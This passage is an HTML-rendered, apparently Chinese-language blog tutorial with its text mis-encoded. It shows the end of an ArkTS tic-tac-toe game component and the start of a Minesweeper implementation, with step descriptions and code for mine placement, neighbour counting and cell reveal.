¼</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">board</span>[line[i]][line[i + <span class="number">1</span>]].<span class="property">value</span> === player) &#123; <span class="comment">// å¦‚æœæ˜¯è¯¥ç©å®¶çš„æ ‡è®°</span></span><br><span class="line">          noEmptyCount++; <span class="comment">// è®¡æ•°</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">board</span>[line[i]][line[i + <span class="number">1</span>]].<span class="property">value</span> === <span class="string">&#x27;&#x27;</span>) &#123; <span class="comment">// å¦‚æœä¸ºç©º</span></span><br><span class="line">          missingIndex = i; <span class="comment">// è®°å½•ç©ºæ ¼ä½ç½®</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (noEmptyCount === <span class="number">2</span> &amp;&amp; missingIndex != -<span class="number">1</span>) &#123; <span class="comment">// å¦‚æœæœ‰ä¸¤ä¸ªæ ‡è®°ä¸”æœ‰ä¸€ä¸ªç©ºæ ¼</span></span><br><span class="line">        <span class="keyword">return</span> [line[missingIndex], line[missingIndex + <span class="number">1</span>]]; <span class="comment">// è¿”å›ç©ºæ ¼ä½ç½®</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// æœªæ‰¾åˆ°åˆé€‚ä½ç½®</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å¯»æ‰¾ä¸€ä¸ªéšæœºçš„åˆæ³•è½å­ä½ç½®</span></span><br><span class="line">  <span class="title function_">findRandomMove</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">emptyCells</span>: number[][] = []; <span class="comment">// å­˜å‚¨ç©ºæ ¼ä½ç½®</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">board</span>[i][j].<span class="property">value</span> === <span class="string">&#x27;&#x27;</span>) &#123; <span class="comment">// å¦‚æœå•å…ƒæ ¼ä¸ºç©º</span></span><br><span class="line">          emptyCells.<span class="title function_">push</span>([i, j]); <span class="comment">// æ·»åŠ åˆ°ç©ºæ ¼åˆ—è¡¨</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (emptyCells.<span class="property">length</span> &gt; <span class="number">0</span>) &#123; <span class="comment">// å¦‚æœæœ‰ç©ºæ ¼</span></span><br><span class="line">      <span class="keyword">return</span> emptyCells[<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * emptyCells.<span class="property">length</span>)]; <span class="comment">// éšæœºé€‰æ‹©ä¸€ä¸ªç©ºæ ¼</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// æœªæ‰¾åˆ°ç©ºæ ¼</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ„å»ºæ¸¸æˆç•Œé¢</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">20</span> &#125;) &#123; <span class="comment">// åˆ›å»ºä¸»åˆ—å¸ƒå±€</span></span><br><span class="line">      <span class="title class_">Flex</span>(&#123; <span class="attr">wrap</span>: <span class="title class_">FlexWrap</span>.<span class="property">Wrap</span> &#125;) &#123; <span class="comment">// åˆ›å»ºä¸»è¡Œå¸ƒå±€</span></span><br><span class="line">        <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">board</span>, <span class="function">(<span class="params">row: GridCell[], _index: number</span>) =&gt;</span> &#123; <span class="comment">// éå†æ¯ä¸€è¡Œ</span></span><br><span class="line">          <span class="title class_">ForEach</span>(row, <span class="function">(<span class="params">cell: GridCell, _index: number</span>) =&gt;</span> &#123; <span class="comment">// éå†æ¯ä¸€ä¸ªå•å…ƒæ ¼</span></span><br><span class="line">            <span class="title class_">Text</span>(cell.<span class="property">value</span>) <span class="comment">// æ˜¾ç¤ºå•å…ƒæ ¼å†…çš„æ–‡æœ¬</span></span><br><span class="line">              .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">              .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">              .<span class="title function_">margin</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellMargin&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®è¾¹è·</span></span><br><span class="line">              .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize / <span class="number">2</span>&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®å­—ä½“å¤§å°</span></span><br><span class="line">              .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>) <span class="comment">// å±…ä¸­æ–‡æœ¬</span></span><br><span class="line">              .<span class="title function_">backgroundColor</span>(cell.<span class="property">value</span> === <span class="string">&#x27;X&#x27;</span> ? <span class="title class_">Color</span>.<span class="property">Red</span> : <span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">                cell.<span class="property">value</span> === <span class="string">&#x27;O&#x27;</span> ? <span class="title class_">Color</span>.<span class="property">Blue</span> : <span class="title class_">Color</span>.<span class="property">Gray</span>)</span><br><span class="line">              .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// è®¾ç½®å­—ä½“é¢œè‰²</span></span><br><span class="line">              .<span class="title function_">borderRadius</span>(<span class="number">5</span>) <span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">              .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">placeMark</span>(cell.<span class="property">rowIndex</span>, cell.<span class="property">colIndex</span>); <span class="comment">// è½å­</span></span><br><span class="line">              &#125;);</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;(<span class="variable language_">this</span>.cellSize + <span class="variable language_">this</span>.cellMargin * <span class="number">2</span>) * <span class="number">3</span>&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">      <span class="title class_">Button</span>(<span class="string">&#x27;é‡æ–°å¼€å§‹&#x27;</span>) <span class="comment">// é‡æ–°å¼€å§‹æŒ‰é’®</span></span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">&#x27;50%&#x27;</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">&#x27;10%&#x27;</span>) <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">        .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">initGame</span>(); <span class="comment">// é‡æ–°å¼€å§‹æ¸¸æˆ</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>); <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="mine"><a href="#mine" class="headerlink" title="mine"></a>mine</h1><p>æ‰«é›· </p><p>å®ç°æ­¥éª¤</p><p>æ­¥éª¤1ï¼šå®šä¹‰æ¸¸æˆçŠ¶æ€</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦å®šä¹‰æ¸¸æˆçš„çŠ¶æ€å˜é‡ï¼ŒåŒ…æ‹¬æ¸¸æˆé¢æ¿æ•°æ®ã€åœ°é›·æ•°é‡ã€å·²æ­ç¤ºæ–¹å—é›†åˆã€æ ‡è®°ä¸ºåœ°é›·çš„æ–¹å—é›†åˆç­‰ã€‚</p><p>æ­¥éª¤2ï¼šåˆå§‹åŒ–æ¸¸æˆ</p><p>åœ¨ç»„ä»¶å³å°†æ˜¾ç¤ºæ—¶åˆå§‹åŒ–æ¸¸æˆï¼ŒåŒ…æ‹¬æ¸…ç©ºçŠ¶æ€å˜é‡ã€ç”Ÿæˆæ¸¸æˆé¢æ¿ã€æ”¾ç½®åœ°é›·ç­‰ã€‚</p><p>æ­¥éª¤3ï¼šç”Ÿæˆæ¸¸æˆé¢æ¿ä¸æ”¾ç½®åœ°é›·</p><p>æ¸¸æˆé¢æ¿ç”±10x10çš„æ–¹å—ç»„æˆï¼Œéšæœºæ”¾ç½®10ä¸ªåœ°é›·ï¼Œå¹¶è®¡ç®—æ¯ä¸ªæ–¹å—å‘¨å›´çš„åœ°é›·æ•°é‡ã€‚</p><p>æ­¥éª¤4ï¼šå¤„ç†ç”¨æˆ·äº¤äº’</p><p>ç”¨æˆ·å¯ä»¥é€šè¿‡ç‚¹å‡»æ–¹å—æ¥æ­ç¤ºå…¶å†…å®¹ï¼Œä¹Ÿå¯ä»¥é€šè¿‡é•¿æŒ‰æ¥æ ‡è®°åœ°é›·ã€‚</p><p>æ­¥éª¤5ï¼šæ˜¾ç¤ºæ¸¸æˆç»“æœ</p><p>å½“ç©å®¶æ­ç¤ºåˆ°åœ°é›·æ—¶ï¼Œæ¸¸æˆç»“æŸï¼›å½“æ‰€æœ‰éé›·æ–¹å—éƒ½è¢«æ­ç¤ºæ—¶ï¼Œæ¸¸æˆèƒœåˆ©ã€‚</p><p>æ­¥éª¤6ï¼šå®šä¹‰Cellç±»</p><p>æœ€åï¼Œå®šä¹‰ä¸€ä¸ªCellç±»æ¥å­˜å‚¨æ¯ä¸ªæ–¹å—çš„ä¿¡æ¯ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; promptAction &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">MineSweeper</span> &#123;</span><br><span class="line">  <span class="comment">// æ¸¸æˆé¢æ¿æ•°æ®</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">gameBoard</span>: <span class="title class_">Cell</span>[][] = [];</span><br><span class="line">  <span class="comment">// åœ°é›·æ€»æ•°</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">mineCount</span>: number = <span class="number">10</span>;</span><br><span class="line">  <span class="comment">// å·²ç»æ­ç¤ºçš„æ–¹å—é›†åˆ</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">revealedCells</span>: <span class="title class_">Set</span>&lt;string&gt; = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line">  <span class="comment">// æ ‡è®°ä¸ºåœ°é›·çš„æ–¹å—é›†åˆ</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">flaggedCells</span>: <span class="title class_">Set</span>&lt;string&gt; = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line">  <span class="comment">// æ–¹å—å¤§å°</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">cellSize</span>: number = <span class="number">60</span>;</span><br><span class="line">  <span class="comment">// æ–¹å—ä¹‹é—´çš„è¾¹è·</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">cellMargin</span>: number = <span class="number">2</span>;</span><br><span class="line">  <span class="comment">// æ¸¸æˆå¼€å§‹æ—¶é—´</span></span><br><span class="line">  private <span class="attr">startTime</span>: number = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">  <span class="comment">// æ¸¸æˆç»“æŸæ ‡å¿—</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">isGameOver</span>: boolean = <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// åœ¨ç»„ä»¶å³å°†æ˜¾ç¤ºæ—¶åˆå§‹åŒ–æ¸¸æˆ</span></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">initializeGame</span>();</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// åˆå§‹åŒ–æ¸¸æˆ</span></span><br><span class="line">  private <span class="title function_">initializeGame</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isGameOver</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">startTime</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">revealedCells</span>.<span class="title function_">clear</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">flaggedCells</span>.<span class="title function_">clear</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">generateBoard</span>();</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// ç”Ÿæˆæ¸¸æˆé¢æ¿</span></span><br><span class="line">  private <span class="title function_">generateBoard</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">gameBoard</span> = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameBoard</span>.<span class="title function_">push</span>([]);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">gameBoard</span>[i].<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">Cell</span>(i, j));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">placeMines</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">calculateNumbers</span>();</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// éšæœºæ”¾ç½®åœ°é›·</span></span><br><span class="line">  private <span class="title function_">placeMines</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> placed = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (placed &lt; <span class="variable language_">this</span>.<span class="property">mineCount</span>) &#123;</span><br><span class="line">      <span class="keyword">let</span> x = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">10</span>);</span><br><span class="line">      <span class="keyword">let</span> y = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">10</span>);</span><br><span class="line">      <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">gameBoard</span>[x][y].<span class="property">hasMine</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">gameBoard</span>[x][y].<span class="property">hasMine</span> = <span class="literal">true</span>;</span><br><span class="line">        placed++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// è®¡ç®—æ¯ä¸ªæ–¹å—å‘¨å›´çš„åœ°é›·æ•°é‡</span></span><br><span class="line">  private <span class="title function_">calculateNumbers</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">gameBoard</span>[i][j].<span class="property">hasMine</span>) &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">gameBoard</span>[i][j].<span class="property">neighborMines</span> = <span class="variable language_">this</span>.<span class="title function_">countNeighborMines</span>(i, j);</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">gameBoard</span>[i][j].<span class="property">value</span> = <span class="variable language_">this</span>.<span class="property">gameBoard</span>[i][j].<span class="property">neighborMines</span>.<span class="title function_">toString</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">gameBoard</span>[i][j].<span class="property">value</span> = <span class="string">&#x27;é›·&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// è®¡ç®—ç»™å®šåæ ‡å‘¨å›´åœ°é›·çš„æ•°é‡</span></span><br><span class="line">  private <span class="title function_">countNeighborMines</span>(<span class="attr">row</span>: number, <span class="attr">col</span>: number): number &#123;</span><br><span class="line">    <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> dx = -<span class="number">1</span>; dx &lt;= <span class="number">1</span>; dx++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> dy = -<span class="number">1</span>; dy &lt;= <span class="number">1</span>; dy++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (dx === <span class="number">0</span> &amp;&amp; dy === <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> newRow = row + dx, newCol = col + dy;</span><br><span class="line">        <span class="keyword">if</span> (newRow &gt;= <span class="number">0</span> &amp;&amp; newRow &lt; <span class="number">10</span> &amp;&amp; newCol &gt;= <span class="number">0</span> &amp;&amp; newCol &lt; <span class="number">10</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">gameBoard</span>[newRow][newCol].<span class="property">hasMine</span>) &#123;</span><br><span class="line">          count++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ­ç¤ºæ–¹å—</span></span><br><span class="line">  private <span class="title function_">revealCell</span>(<span class="params">row: number, col: number</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isGameOver</span> || <span class="variable language_">this</span>.<span class="property">revealedCells</span>.<span class="title function_">has</span>(<span class="string">`<span class="subst">$&#123;row&#125;</span>,<span class="subst">$&#123;col&#125;</span>`</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">const</span> key = <span class="string">`<span class="subst">$&#123;row&#125;</span>,<span class="subst">$&#123;col&#125;</span>`</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">revealedCells</span>.<span class="title function_">add</span>(key);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">gameBoard</span>[row][col].<span class="property">hasMine</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">showGameOverDialog</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">gameBoard</span>[row][col].<span class="property">neighborMines</span> === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> dx = -<span class="number">1</span>; dx &lt;= <span class="number">1</span>; dx++) &#123;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">let</span> dy = -<span class="number">1</span>; dy &lt;= <span class="number">1</span>; dy++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dx === <span class="number">0</span> &amp;&amp; dy === <span class="number">0</span>) &#123;</span><br><span class="line">              <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">let</span> newRow = row + dx, newCol = col + dy;</span><br><span class="line">            <span class="keyword">if</span> (newRow &gt;= <span class="number">0</span> &amp;&amp; newRow &lt; <span class="number">10</span> &amp;&amp; newCol &gt;= <span class="number">0</span> &amp;&amp; newCol &lt; <span class="number">10</span>) &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">revealCell</span>(newRow, newCol);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="title function_">isVictory</span>()) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">showVictoryDialog</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ˜¾ç¤ºæ¸¸æˆç»“æŸå¯¹è¯æ¡†</span></span><br><span class="line">  private <span class="title function_">showGameOverDialog</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isGameOver</span> = <span class="literal">true</span>;</span><br><span class="line">    promptAction.<span class="title function_">showDialog</span>(&#123;</span><br><span class="line">      <span class="attr">title</span>: <span class="string">&#x27;æ¸¸æˆç»“æŸ: æ¸¸æˆå¤±è´¥ï¼&#x27;</span>,</span><br><span class="line">      <span class="attr">buttons</span>: [&#123; <span class="attr">text</span>: <span class="string">&#x27;é‡æ–°å¼€å§‹&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;#ffa500&#x27;</span> &#125;]</span><br><span class="line">    &#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">initializeGame</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ˜¾ç¤ºèƒœåˆ©å¯¹è¯æ¡†</span></span><br><span class="line">  private <span class="title function_">showVictoryDialog</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isGameOver</span> = <span class="literal">true</span>;</span><br><span class="line">    promptAction.<span class="title function_">showDialog</span>(&#123;</span><br><span class="line">      <span class="attr">title</span>: <span class="string">&#x27;æ­å–œä½ ï¼Œæ¸¸æˆèƒœåˆ©ï¼&#x27;</span>,</span><br><span class="line">      <span class="attr">message</span>: <span class="string">`ç”¨æ—¶ï¼š<span class="subst">$&#123;((<span class="built_in">Date</span>.now() - <span class="variable language_">this</span>.startTime) / <span class="number">1000</span>).toFixed(<span class="number">3</span>)&#125;</span>ç§’`</span>,</span><br><span class="line">      <span class="attr">buttons</span>: [&#123; <span class="attr">text</span>: <span class="string">&#x27;é‡æ–°å¼€å§‹&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;#ffa500&#x27;</span> &#125;]</span><br><span class="line">    &#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable 